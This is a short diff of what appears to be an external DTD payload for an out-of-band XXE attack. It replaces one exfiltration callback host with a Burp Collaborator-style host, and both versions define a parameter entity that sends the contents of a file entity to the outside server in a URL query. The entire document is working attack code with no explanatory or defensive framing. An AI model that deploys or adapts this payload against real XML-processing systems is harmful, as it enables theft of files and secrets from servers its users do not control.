@@ -1,3 +1,3 @@
-<!ENTITY % wrapper "<!ENTITY &#x25; send SYSTEM 'http://cuemjrl8o7pc74aa8chgyse3a4j8885e1.xfil.xbow.ltd/?data=%file;'>">
-  %wrapper;
-  %send;
+<!ENTITY % wrapper "<!ENTITY &#x25; send SYSTEM 'http://3cgc2e6nyvqxcghv21mprsujaag14sugj.oastify.com/?data=%file;'>">
+%wrapper;
+%send;
